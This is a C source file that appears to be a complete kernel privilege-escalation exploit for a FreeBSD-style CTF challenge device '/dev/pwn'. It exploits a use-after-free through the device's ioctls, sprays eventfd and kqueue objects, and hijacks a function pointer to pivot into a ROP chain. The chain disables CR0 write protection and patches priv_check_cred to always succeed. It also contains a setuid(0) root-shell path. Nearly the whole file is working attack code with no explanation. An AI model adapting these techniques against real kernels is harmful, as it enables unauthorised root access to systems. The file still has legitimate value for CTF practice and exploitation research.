#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/timerfd.h>
#include <err.h>
#include <poll.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/event.h>
#include <sys/eventfd.h>

int create_eventfd() {
    int fd = eventfd(0, 0);
    if (fd < 0)
        err(1, "eventfd");
    return fd;
}

struct pwndata {
	char data[128];
};

#define	PWN_IOC_ALLOC _IO('v', 0x00)
#define	PWN_IOC_FREE _IO('v', 0x01)
#define	PWN_IOC_EDIT _IOWR('v', 0x02, struct pwndata)

void shell() {
    puts("reached userspace shell");
    _exit(0);
}

uint64_t user_sp, user_rflags, user_rip = (uint64_t)shell;

void save_state() {
  __asm__(
    "mov %rsp, user_sp;"
    "pushf;"
    "pop user_rflags;"
  );
}

int main(int argc, char **argv) {
    if (argc == 2 && !strcmp(argv[1], "SHELL")) {
        setuid(0);
        system("/bin/sh");
        _exit(0);
    }

    uint64_t *p;

    // 0xffffffff80bccd66: mov rdi, rbx; call qword ptr [rbx+0x10];
    uint64_t MOV_RDI_RBX_CALL_RBX_0X10 = 0xffffffff80bccd66;
    // 0xffffffff80fd4dcf: mov rsp, [rdi+0x28]; mov rbx, [rdi+0x30]; mov rax, [rdi+0x38]; mov [rsp], rax; xor eax, eax; ret;
    uint64_t MOV_REGS = 0xffffffff80fd4dcf;
    // 0xffffffff80fdbe04: mov cr0, rax; ret;
    uint64_t MOV_CR0_RAX = 0xffffffff80fdbe04;
    // 0xffffffff810d32a2: pop rax; ret;
    uint64_t POP_RAX = 0xffffffff810d32a2;
    // 0xffffffff810d32a3: ret;
    uint64_t RET = 0xffffffff810d32a3;
    // 0xffffffff809b44d2: mov [rdi], rsi; ret;
    uint64_t WRITE_RSI_TO_RDI = 0xffffffff809b44d2;
    // 0xffffffff80f383ce: pop rsi; ret;
    uint64_t POP_RSI = 0xffffffff80f383ce;
    // 0xffffffff80fe2101: pop rdi; ret;
    uint64_t POP_RDI = 0xffffffff80fe2101;

    uint64_t RETURN_FROM_SYSCALL = 0xffffffff80fd7393;

    uint64_t PRIV_CHECK_CRED = 0xffffffff80b13230;
    uint64_t CHECK_PATCH = 0x9090909090c3c031; // xor eax, eax; ret
    uint64_t CR0_VAL = 0x8004003b;
    uint64_t SPRAYED_STACK = 0xfffff80000000000ULL+0x100000*400;

    size_t sprayed_stack_sz = 0x100000*500;
    void *sprayed_stack = mmap(NULL, sprayed_stack_sz, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (sprayed_stack == MAP_FAILED)
        err(1, "mmap");

    // memset(sprayed_stack, 0x43, sprayed_stack_sz);

    save_state();

    for (size_t i = 0; i < sprayed_stack_sz / 0x1000; i++) {
        p = (uint64_t*)((char*)sprayed_stack + 0x1000 * i);
        *p++ = 0; // will be overwritten
        *p++ = POP_RAX;
        *p++ = CR0_VAL;
        *p++ = MOV_CR0_RAX;
        *p++ = POP_RDI;
        *p++ = PRIV_CHECK_CRED;
        *p++ = POP_RSI;
        *p++ = CHECK_PATCH;
        *p++ = WRITE_RSI_TO_RDI;
        *p++ = RETURN_FROM_SYSCALL;

        *p++ = 1; // rdi
        *p++ = 2; // rsi
        *p++ = 3; // rdx
        p += 3;
        *p++ = 4; // rax
        p += 12;
        *p++ = user_rip; // rcx -> RIP
        *p++ = 2;
        *p++ = user_rflags; // r11 -> RFLAGS
        *p++ = user_sp; // rsp
    }

    int fd = open("/dev/pwn", O_RDONLY);
    if (fd < 0)
        err(1, "open");

    struct pwndata pwn;
    memset(pwn.data, 0x42, sizeof(pwn.data));

    ioctl(fd, PWN_IOC_ALLOC, NULL);
    ioctl(fd, PWN_IOC_FREE, NULL);

    int efds[512];
    puts("creating eventfds!");
    for (int i = 0; i < 512; i++)
        efds[i] = create_eventfd();
    puts("eventfds created!");


    p = (unsigned long*)&pwn.data;
    *p++ = 0x1123456789abcdef; // 0x00
    *p++ = 0x2123456789abcdef; // 0x08
    *p++ = 0x3123456789abcdef; // 0x10
    *p++ = 0x4123456789abcdef; // 0x18
    *p++ = 0x0; // 0x20 this must be 0 or panic in knote
    *p++ = MOV_RDI_RBX_CALL_RBX_0X10; // 0x28 <- first call
    *p++ = MOV_REGS; // 0x30 <- second call
    *p++ = 0x3333333333333333; // 0x38
    *p++ = 0x4444444444444444; // 0x40
    *p++ = SPRAYED_STACK; // 0x48
    *p++ = 0x0; // 0x50
    *p++ = RET; // 0x58 // first call of pivoted stack
    *p++ = 0x0000000001030000; // 0x60
    *p++ = 0x7777777777777777; // 0x68
    *p++ = 0x0; // 0x70
    *p++ = 0x9999999999999999; // 0x78

    ioctl(fd, PWN_IOC_EDIT, &pwn);

    int ntfds  = 512;
    int nev   = ntfds;
    struct kevent chlist[ntfds]; 
    int kq = kqueue();

    for (int i = 0; i < ntfds; i++)
        EV_SET(&chlist[i], efds[i], EVFILT_READ, EV_ADD, 0, 0, 0);

    int ret = kevent(kq, chlist, nev, NULL, 0, NULL);
    if (ret < 0)
        err(1, "kevent");

    puts("done");
    sleep(100);
    puts("bye");
    return 0;
}